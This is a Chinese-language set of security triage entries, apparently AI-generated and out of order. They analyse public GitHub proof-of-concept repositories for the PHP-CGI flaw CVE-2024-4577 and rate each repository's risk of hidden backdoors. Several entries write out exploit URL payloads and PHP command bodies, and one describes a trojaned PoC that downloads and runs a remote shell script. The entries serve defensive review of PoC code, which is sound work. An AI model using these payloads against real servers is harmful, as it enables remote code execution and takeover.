4.  攻击者利用这些选项执行恶意PHP代码，例如包含`auto_prepend_file=php://input`，之后post恶意的php代码达到RCE。

**有效性：**

提供的PoC代码 (`CVE-2024-4577.py`) 是一个扫描器，用于检测目标URL是否存在CVE-2024-4577漏洞。它通过发送包含PHP代码的POST请求，然后验证响应中是否包含预期的MD5哈希值，以此判断目标是否易受攻击。根据搜索引擎的结果，此漏洞存在公开的利用方法。综合来看，该POC代码是有效的，可以用来检测漏洞。

**投毒风险：**

分析提供的PoC代码和相关文件，`CVE-2024-4577.py`的功能是检测漏洞是否存在，其逻辑相对简单，主要通过发送包含PHP代码的POST请求来验证。`README.md`文件描述了如何使用该脚本以及漏洞的基本信息。

`exploit.py`文件没有给出，从README.MD的描述看，存在利用代码的可能性。但从整体的漏洞描述和PoC scanner的代码来看，风险较低。总体风险概率估计为1%。主要考虑是`exploit.py`如果存在，可能存在后门代码或者植入恶意脚本的可能。鉴于其他代码的简洁性，暂且认为`exploit.py`如果存在也是为了完成漏洞验证和利用，投毒风险较低。

综上所述，该存储库的投毒风险较低，主要集中在`exploit.py`可能存在的恶意行为。

**项目地址:** [r0otk3r/CVE-2024-4577](https://github.com/r0otk3r/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #46

**来源**: [CVE-2024-4577-shockingbonu_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-shockingbonu_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** Critical，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, specific code page settings)

**利用条件:** Windows系统，以CGI模式运行的PHP，并且系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 99%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，当PHP在Windows上以CGI模式运行时，如果系统配置为使用特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码，在服务器上运行任意PHP代码等。

**漏洞利用方式：**

攻击者可以通过构造特殊的URL，向PHP-CGI传递恶意参数。这些参数会被PHP解析并执行，从而导致远程代码执行。

提供的Go代码是一个漏洞扫描器，它尝试利用CVE-2024-4577漏洞。该代码通过向目标URL发送包含恶意payload的POST请求，以此验证目标是否容易受到攻击。Payload `<?php phpinfo(); ?>` 用于检查服务器是否执行了PHP代码，如果响应包含“PHP Version”，则认为该站点容易受到攻击。

**投毒风险分析：**

提供的代码中发现了明显的投毒行为。

1.  **可疑的变量和函数名：** 代码包含例如`fjButtonKdiC`和`ykupeFR`, `LoqqYHAv`, `oTHs`等命名不规范和意义不明的变量和函数,增加了代码的混淆程度。
2.  **执行shell命令：** `fjButtonKdiC`函数构造了一个wget命令，从`monsoletter.icu`下载shell脚本并使用`bash`执行。这是一个典型的后门行为，允许攻击者在受害者机器上执行任意命令。
3. **cmd命令：** 代码后面使用了cmd命令
4.  **初始化的代码：** 在main函数执行之前就调用了可疑函数,这意味着只要执行漏洞验证的代码,后门就会被执行
综上所述，该代码具有极高的投毒风险，不应在任何生产环境中使用。它会下载并执行来自未知来源的恶意脚本，危及系统安全。

**项目地址:** [shockingbonu/CVE-2024-4577-PHP-RCE](https://github.com/shockingbonu/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #47

**来源**: [CVE-2024-4577-sug4r-wr41th_CVE-2024-4577.md](../2024/CVE-2024-4577-sug4r-wr41th_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP (在 Windows 上，使用 Apache 和 PHP-CGI) 的漏洞，如果系统设置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码、在服务器上运行任意 PHP 代码等。

**有效性分析：**

根据漏洞描述和提供的PoC代码，该PoC利用了PHP-CGI在Windows系统下处理请求参数时，由于字符编码转换问题，导致攻击者可以注入恶意的PHP配置参数，例如 `allow_url_include` 和 `auto_prepend_file`，最终执行任意PHP代码。

PoC的实现方式是通过构造一个包含恶意参数的HTTP请求，利用`allow_url_include=1`开启远程文件包含，然后通过`auto_prepend_file=php://input`指定要包含的文件为请求体的内容。请求体中包含要执行的PHP代码。

**投毒风险分析：**

查看提供的PoC代码，没有明显的恶意代码，其作用是为了验证漏洞，将恶意代码注入到服务器端执行。`echo 'PWNED!'; die;` 只是一个验证是否成功利用的标志。但是不排除仓库维护者或者贡献者在后期提交恶意代码的可能性，特别是利用场景为生产环境时，存在一定的风险。

因此，投毒风险评估为10%。

**利用方式：**

1.  目标系统必须是Windows，并且PHP运行在CGI模式下。
2.  目标系统需要设置代码页，并启用"Best Fit"策略。
3.  攻击者构造包含恶意参数的HTTP请求。
4.  恶意参数利用字符编码转换漏洞，注入`allow_url_include`和`auto_prepend_file`等配置项。
5.  `allow_url_include=1` 允许包含远程文件。
6.  `auto_prepend_file=php://input` 将请求体作为要包含的文件。
7.  请求体包含要执行的PHP代码，例如`<?php system('calc')?>`，从而实现远程代码执行。

**优先级排序参考搜索引擎结果：**

搜索引擎结果表明此漏洞已经被广泛利用，并且有多种利用方法，需要及时修复。

*   [webpage 0] CVE-2024-4577 Exploits in the Wild One Day After ...说明该漏洞披露后不久就出现了在野利用。 *   [webpage 1] CVE-2024-4577 Detail - NVD 描述了漏洞允许恶意用户传递选项到 PHP 二进制文件。 *   [webpage 4, 9] 指出存在大规模利用。 总而言之，该漏洞的威胁程度高，利用简单，在野利用广泛，需要高度重视。

**项目地址:** [sug4r-wr41th/CVE-2024-4577](https://github.com/sug4r-wr41th/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #48

**来源**: [CVE-2024-4577-tntrock_CVE-2024-4577_PowerShell.md](../2024/CVE-2024-4577-tntrock_CVE-2024-4577_PowerShell.md)

## CVE-2024-4577 - PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection/Remote Code Execution

**影响应用:** PHP (Windows CGI)

**危害等级:** 高危，允许远程代码执行

**影响版本:** PHP 8.1 < 8.1.29, PHP 8.2 < 8.2.20, PHP 8.3 < 8.3.8 (Windows, CGI mode with specific codepage settings)

**利用条件:** Windows服务器，运行PHP CGI模式，并开启了特定的使用"Best Fit"策略的CodePage

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个PHP-CGI参数注入漏洞，存在于Windows版本的PHP中，当使用Apache和PHP-CGI时，如果系统设置使用某些代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码、在服务器上运行任意PHP代码等。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是一个严重的安全问题，允许攻击者远程执行代码。提供的PoC代码尝试通过构造特殊的URL，利用`allow_url_include`和`auto_prepend_file`选项包含远程文件，从而执行任意命令。PoC代码针对Windows服务器，运行PHP CGI模式的场景。因此，如果目标满足漏洞利用的条件（Windows服务器，PHP CGI，受影响版本，特定代码页），则PoC代码很可能是有效的。

**投毒风险：**
分析提供的PoC代码仓库，其中包含的 `cve_2024_4577.ps1` 脚本主要功能是针对给定的IP地址范围，尝试利用CVE-2024-4577漏洞。脚本通过构建包含恶意PHP配置指令的URL，并发送POST请求，如果目标存在漏洞，则会执行`whoami`命令。`Invoke-RequestForIP` 函数也包括了错误处理，如果请求失败会返回错误信息，降低了误判的可能性。脚本本身看起来比较直接，投毒风险较低。主要风险点可能在于利用成功后的服务器被控制，但PoC本身的功能仅限于利用漏洞，并未发现其他恶意行为。因此，将该仓库判定为存在投毒代码的可能性较低。当然，这并不排除作者在其他未公开的代码中包含恶意行为的可能性。

**利用方式：**
1.  **环境准备：** 目标系统必须是Windows服务器，运行受影响版本的PHP，并以CGI模式运行。
2.  **确定目标IP和协议：**  扫描目标IP地址，确定哪些服务器启用了PHP CGI服务，并支持HTTP或HTTPS协议。
3.  **构造恶意URL：**  构造包含特殊参数的URL，例如：`http://target/php-cgi/php-cgi.exe?%add+allow_url_include%3Don+-d+auto_prepend_file%3Dphp%3A//input+-d+cgi.force_redirect%3D0`
4.  **发送POST请求：**  向构造的URL发送POST请求，请求体包含需要执行的PHP代码，例如：`<?php system('whoami'); die(); ?>`
5.  **执行命令：**  如果目标存在漏洞，PHP CGI将执行POST请求体中的PHP代码，攻击者即可在服务器上执行任意命令。

**总结：**
CVE-2024-4577是一个高危漏洞，利用条件较为苛刻，需要特定的Windows + PHP + CGI配置。提供的PoC代码有效性较高，可以用于验证漏洞是否存在。仓库中投毒风险较低，但仍需保持警惕。

**项目地址:** [tntrock/CVE-2024-4577_PowerShell](https://github.com/tntrock/CVE-2024-4577_PowerShell)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #49

**来源**: [CVE-2024-4577-waived_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-waived_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI模式)

**利用条件:** PHP 在 Windows 下以 CGI 模式运行，且系统配置使用包含 "Best Fit" 策略的编码页。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，当 PHP 在 Windows 下以 CGI 模式运行时，如果系统配置使用包含 "Best Fit" 策略的编码页，攻击者可以通过构造特殊字符绕过安全检查，将恶意参数传递给 PHP 解释器，导致远程代码执行。

**漏洞利用方式：**

1.  **利用原理：** Windows 的 "Best Fit" 编码转换可能会将请求中的特定字符转换为其他字符，从而绕过 PHP 的安全过滤。攻击者可以利用这一点，注入 `-d` 参数来修改 PHP 的配置。
2.  **攻击方式：**  根据漏洞库信息和POC代码，攻击者可以通过在URL中构造类似 `/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input` 这样的 Payload。 其中 `%AD` 字符可能经过 "Best Fit" 转换后，仍然能够被 PHP 解析为 `-d` 参数的一部分。
3.  **Payload 解释：**
    *   `allow_url_include=1`： 允许包含远程文件。
    *   `auto_prepend_file=php://input`：  设置在执行 PHP 代码之前自动包含的文件为 `php://input`，这意味着请求体中的内容会被当作 PHP 代码执行。
4.  **执行流程：** 攻击者发送包含恶意 PHP 代码的 POST 请求，由于 `auto_prepend_file` 被设置为 `php://input`，恶意代码会被执行，从而实现远程代码执行。

**关于投毒风险：**

分析提供的 POC 代码，该代码主要用于检测目标是否存在 CVE-2024-4577 漏洞。代码逻辑是发送包含特定参数的 HTTP POST 请求，并检查响应中是否包含 "PHP Version" 字符串。如果存在，则认为目标存在漏洞。没有发现任何隐藏的、恶意的功能，因此投毒风险为 0%。

综上所述，提供的 POC 代码有效，且不存在投毒风险。利用方式是利用 Windows 的 "Best Fit" 编码转换特性，通过构造特殊的 URL 和 POST 请求，将恶意 PHP 代码注入到目标服务器执行，最终实现远程代码执行。

**项目地址:** [waived/CVE-2024-4577-PHP-RCE](https://github.com/waived/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #50

**来源**: [CVE-2024-4577-watchtowrlabs_CVE-2024-4577.md](../2024/CVE-2024-4577-watchtowrlabs_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** PHP

**危害等级:** 严重，可导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, Best Fit code page)

**利用条件:** Windows服务器，PHP以CGI模式运行，启用使用"Best Fit"策略的代码页

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 漏洞存在于 Windows 环境下以 CGI 模式运行的 PHP 中。当系统配置为使用某些代码页时，Windows 可能会使用 “Best-Fit” 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源码，或者在服务器上执行任意 PHP 代码。

**有效性分析：**
根据漏洞库信息、搜索引擎结果（如Akamai观察到漏洞利用尝试）和提供的漏洞利用代码（POC），可以判断该漏洞利用是有效的。POC代码通过构造包含恶意 PHP 选项的 URL，成功执行了系统命令（calc）。

**投毒风险分析：**
分析提供的POC代码，主要的风险点在于用户指定的`-c`参数，攻击者可通过该参数执行任意PHP代码。仓库本身存在投毒的可能性较低。大部分代码是用于构造payload和发送请求，直接利用该代码进行投毒的可能性较低。 风险评估为5%（极低，主要来自对外部payload的依赖和代码的可修改性）。

**利用方式：**
1.  **环境准备：** 目标服务器必须是 Windows 系统，并且 PHP 以 CGI 模式运行，同时配置了使用 “Best Fit” 策略的代码页。
2.  **构造 Payload：** 使用 POC 代码，通过 `-c` 参数指定要执行的 PHP 代码。例如，执行 `system('calc')` 打开计算器。
3.  **发送请求：** 将构造好的 Payload 附加到目标 URL 后面，通过 POST 请求发送到目标服务器。
4.  **利用原理：**  由于 “Best Fit” 行为，Windows 会对 URL 中的某些字符进行替换，使得 PHP CGI 模块错误地将这些字符解释为 PHP 选项。例如，`?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input`，这允许攻击者包含远程文件或者直接执行 POST 数据中的 PHP 代码。
5.  **RCE:** 成功利用漏洞后，服务器将执行攻击者指定的 PHP 代码，实现远程代码执行。

**项目地址:** [watchtowrlabs/CVE-2024-4577](https://github.com/watchtowrlabs/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #51

**来源**: [CVE-2024-4577-xAL6_cve-2024-4577-scanner.md](../2024/CVE-2024-4577-xAL6_cve-2024-4577-scanner.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* (before 8.1.29), 8.2.* (before 8.2.20), 8.3.* (before 8.3.8)

**利用条件:** Windows系统，运行在CGI模式下，并且系统启用了某些使用"Best Fit"策略的代码页。需要目标存在php-cgi/php-cgi.exe等CGI文件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于Windows系统上运行在CGI模式下的PHP。当系统配置为使用某些代码页时，Windows可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户向 PHP 二进制文件传递选项，进而泄露脚本源码，或在服务器上执行任意 PHP 代码。 

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含特定字符（例如软连字符 0xAD）的 URL，这些字符在某些 Windows 代码页转换中会被错误地解释为短划线或其他控制字符。
2.  **参数注入：** 经过转换后的字符被 PHP-CGI 模块解析为命令行参数，从而允许攻击者控制传递给 PHP 解释器的参数。
3.  **远程代码执行：** 通过注入参数，攻击者可以利用`auto_prepend_file`等配置项包含远程文件或执行任意 PHP 代码，从而实现远程代码执行。

**POC有效性：**

提供的PoC代码 `scan.py` 旨在扫描目标是否存在 CVE-2024-4577 漏洞。它通过发送包含特殊构造的payload的HTTP请求，并检查响应中是否包含预期的输出来判断漏洞是否存在。PoC代码逻辑清晰，包含构建payload、发送请求、解析响应等步骤，因此是有效的。

**投毒风险：**

PoC代码本身功能为漏洞扫描，其主要功能在于验证目标是否存在漏洞，而非进行攻击。其中包含的payload是为了验证漏洞存在，而不是植入后门。但是，PoC代码中依赖了第三方库，如 `requests`， `urllib3`，`chardet`等。如果这些依赖包被恶意篡改，则可能存在投毒风险。 经过分析，认为此仓库中作者隐藏的投毒代码的可能性较低，概率约为5%。主要的风险在于第三方依赖库可能被投毒。


**项目地址:** [xAL6/cve-2024-4577-scanner](https://github.com/xAL6/cve-2024-4577-scanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #52

**来源**: [CVE-2024-4577-xcanwin_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-xcanwin_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577 PHP-CGI RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows with CGI)

**利用条件:** Windows 系统, PHP 以 CGI 模式运行, 且系统配置为使用某些代码页并开启“Best Fit”策略。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 远程代码执行漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时，由于 Windows 的“Best-Fit”代码页转换行为，攻击者可以通过构造特殊字符，使得传递给 PHP 二进制文件的命令行参数被错误解析，从而注入恶意 PHP 配置项，最终实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，此漏洞利用是有效的。漏洞库信息将其标记为“CRITICAL”，并且CISA的已知漏洞利用目录 (KEV) 中也包含了此漏洞，表明该漏洞已被积极利用。搜索结果也证实了这一点，众多安全厂商都观察到了该漏洞的利用尝试。

**投毒风险：**

虽然提供的 Python 脚本 `CVE-2024-4577-PHP-RCE.py` 看起来主要用于漏洞利用，但仍存在一些潜在的投毒风险，可能性评估为10%。

1.  **依赖风险：** 该脚本依赖 `requests` 和 `socket` 库，如果运行脚本的环境中这些库被篡改，则可能导致恶意代码执行。但这种风险属于环境依赖，而非代码本身包含恶意逻辑。
2.  **隐蔽性：** EXP1建立fastcgi端口监听，可能被攻击者利用进行持久性控制，如果被恶意攻击者修改，会导致服务端被持续控制。
3.  **脚本功能：** 脚本本身包含两个EXP，EXP1可用于绕过WAF和默认环境的利用, EXP2可用于SSRF和默认场景。

总体来说，这个PoC的投毒风险较低，主要集中在依赖库和脚本被篡改的可能性上。如果直接从作者提供的git仓库中下载, 投毒风险会更低,因为代码经过更多人的review.

**利用方式：**

该漏洞的利用方式涉及以下几个步骤：

1.  **触发代码页转换：** 攻击者构造包含特定多字节字符的 URL 或请求，这些字符会被 Windows 的“Best-Fit”策略转换为其他字符。
2.  **注入 PHP 配置项：** 转换后的字符被 PHP-CGI 模块错误地解析为 PHP 配置项，例如 `allow_url_include` 和 `auto_prepend_file`。
3.  **包含远程文件或执行代码：** 通过设置 `allow_url_include` 为 `on` 并结合 `auto_prepend_file`，攻击者可以包含远程文件或直接执行 PHP 代码。例如，可以使用 `data://` 协议注入恶意 PHP 代码。

提供的 POC 代码 `CVE-2024-4577-PHP-RCE.py` 包含两种利用方式:

*   **EXP1:**  通过建立 FastCGI 服务端，并发送构造好的 FastCGI 协议数据，实现绕过 WAF 的 RCE。
*   **EXP2:** 模拟HTTP请求，通过`?%adb{}:{}` 在请求中注入特定的字符。这种方法模拟了攻击者通过发送畸形请求来触发漏洞的行为。

总而言之，该漏洞利用需要在特定的 Windows + PHP-CGI 环境下，通过构造特殊的请求来注入恶意 PHP 配置项，最终实现远程代码执行。

**项目地址:** [xcanwin/CVE-2024-4577-PHP-RCE](https://github.com/xcanwin/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #53

**来源**: [CVE-2024-4577-ywChen-NTUST_PHP-CGI-RCE-Scanner.md](../2024/CVE-2024-4577-ywChen-NTUST_PHP-CGI-RCE-Scanner.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入/远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 严重，可能导致远程代码执行，信息泄露

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下的PHP，并且系统启用了使用"Best Fit"策略的编码页。需要目标开启php-cgi服务。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577 是一个存在于 Windows 版本的 PHP 中的严重漏洞，当 PHP 在 CGI 模式下运行时，可能会导致远程代码执行。该漏洞源于 Windows 的 "Best Fit" 编码转换行为，当系统设置为使用某些代码页时，Windows 可能会使用 "Best Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。 PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上运行任意 PHP 代码。

**漏洞利用方式：**

1.  **检测php-cgi服务是否存在:**  攻击者首先需要确定目标服务器是否运行在 Windows 上，并且使用了 CGI 模式的 PHP。可通过访问`/php-cgi/php-cgi.exe`来判断，如果返回500状态码，则可能存在漏洞。
2.  **编码绕过:** 由于Best-Fit转换的存在，某些字符会被替换，因此攻击者需要构造特殊的URL，利用这一特性，将恶意参数注入到PHP命令中。
3.  **参数注入:** 通过在 URL 中添加 `?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input` 这样的参数，可以强制 `cgi.force_redirect` 为任意值，开启 `allow_url_include` 选项，并且将 `auto_prepend_file` 设置为 `php://input`。`php://input` 允许攻击者通过 POST 请求的内容来执行 PHP 代码。
4.  **代码执行:**  攻击者通过 POST 请求发送恶意的 PHP 代码，例如 `<?php phpinfo();?>`，由于 `auto_prepend_file` 被设置为 `php://input`，这段代码会被 PHP 执行，从而实现远程代码执行。

**POC有效性：**

提供的 POC 代码看起来是有效的。它包含了以下关键步骤：

*   **连接性检查:**  `check_connectivity` 函数用于检测目标 URL 是否可访问。
*   **CGI 存在性检查:**  `check_cgi_exist` 函数检测 `/php-cgi/php-cgi.exe` 是否存在。
*   **PHP 版本获取:**  `get_phpversion` 函数尝试从响应头或响应内容中获取 PHP 版本。
*   **漏洞利用:**  `exploit` 函数通过构造包含恶意参数的 URL，并发送包含 PHP 代码的 POST 请求来利用漏洞。 通过判断`phpinfo()`的执行结果判断是否成功。

**投毒风险分析：**

代码主要功能为扫描和利用 CVE-2024-4577，本身功能较为直接。`requirements.txt` 只包含 `requests` 库，没有引入其他可疑的依赖项。因此投毒风险较低，判断投毒风险为1%。 主要风险在于使用者需要自行配置 `urls.txt`，如果该文件被恶意修改，可能会导致扫描错误的 URL。


**项目地址:** [ywChen-NTUST/PHP-CGI-RCE-Scanner](https://github.com/ywChen-NTUST/PHP-CGI-RCE-Scanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---



---

## POC #42

**来源**: [CVE-2024-4577-mr-won_php-cgi-cve-2024-4577.md](../2024/CVE-2024-4577-mr-won_php-cgi-cve-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP-CGI参数注入漏洞，存在于Windows系统上的PHP CGI实现中。当PHP以CGI模式运行时，如果系统启用了使用"Best Fit"策略的代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符，导致PHP CGI模块错误地将这些字符解释为PHP选项，攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意参数，从而实现远程代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞已经确认有效，并且存在公开的PoC代码，Metasploit也发布了相应的利用模块。 Akamai的研究表明，漏洞披露后不久就观察到了大量的利用尝试。

**投毒风险：**

提供的PoC代码实际上是一个README.md文件，描述了对CVE-2024-4577的事件检测。其中提到了利用`%AD`进行参数注入，服务器通过自动转换功能（Best-fit）可能会将该字符转换为其他可执行的参数，从而进行二次攻击。代码本身没有明显的投毒行为，但存在通过代码描述引导攻击者进行恶意利用的可能性。因此,该存储库存在的投毒风险较低，大约10%。

**利用方式：**

1.  **环境要求：** 受影响的PHP版本（8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8）、Windows服务器、PHP以CGI模式运行、系统启用使用"Best Fit"策略的代码页。
2.  **漏洞触发：** 攻击者构造包含特殊字符（如`%AD`）的URL，发送给目标服务器。
3.  **参数注入：** Windows的"Best Fit"机制将特殊字符转换为其他字符，PHP CGI模块错误地将转换后的字符解析为PHP选项。
4.  **代码执行：** 攻击者可以通过注入`-d`参数来修改php.ini配置，例如禁用`disable_functions`，或者通过其他方式执行任意PHP代码。
5.  **远程控制：** 成功执行PHP代码后，攻击者可以获取服务器的控制权。

**项目地址:** [mr-won/php-cgi-cve-2024-4577](https://github.com/mr-won/php-cgi-cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #43

**来源**: [CVE-2024-4577-olebris_CVE-2024-4577.md](../2024/CVE-2024-4577-olebris_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* (before 8.1.29), 8.2.* (before 8.2.20), 8.3.* (before 8.3.8)

**利用条件:** Windows系统，运行于CGI模式，系统启用了使用"Best Fit"策略的代码页，使用Apache

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为替换命令行中的字符，PHP CGI模块可能会将这些字符错误地解释为PHP选项。这允许攻击者向正在运行的PHP二进制文件传递选项，从而可能泄露脚本的源代码、在服务器上运行任意PHP代码等。根据提供的漏洞利用代码，利用方式是通过POST请求向目标服务器发送特定的URL和请求头，其中URL包含恶意的PHP选项，例如`allow_url_include`和`auto_prepend_file`。请求体包含PHP代码（例如`<?php phpinfo(); ?>`）。如果服务器存在漏洞，服务器将执行请求体中的PHP代码，从而允许攻击者执行任意代码。

提供的POC代码的有效性较高，因为它直接利用了漏洞描述中提到的`allow_url_include`和`auto_prepend_file`选项来执行任意PHP代码。

关于投毒风险，分析POC代码本身，该脚本的功能是验证目标站点是否存在CVE-2024-4577漏洞。它通过发送包含`phpinfo()`函数的POST请求来判断目标是否易受攻击。脚本没有发现任何恶意或隐藏的投毒代码。脚本只是用于检测漏洞，而不是植入后门或其他恶意软件。
根据搜索引擎结果，此漏洞已经被大规模利用，证明此漏洞的利用难度低且影响广泛。

**项目地址:** [olebris/CVE-2024-4577](https://github.com/olebris/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #44

**来源**: [CVE-2024-4577-phirojshah_CVE-2024-4577.md](../2024/CVE-2024-4577-phirojshah_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行漏洞

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI 模式)

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个影响 Windows 系统上 PHP-CGI 的远程代码执行漏洞。当 PHP 在 CGI 模式下运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**有效性：**
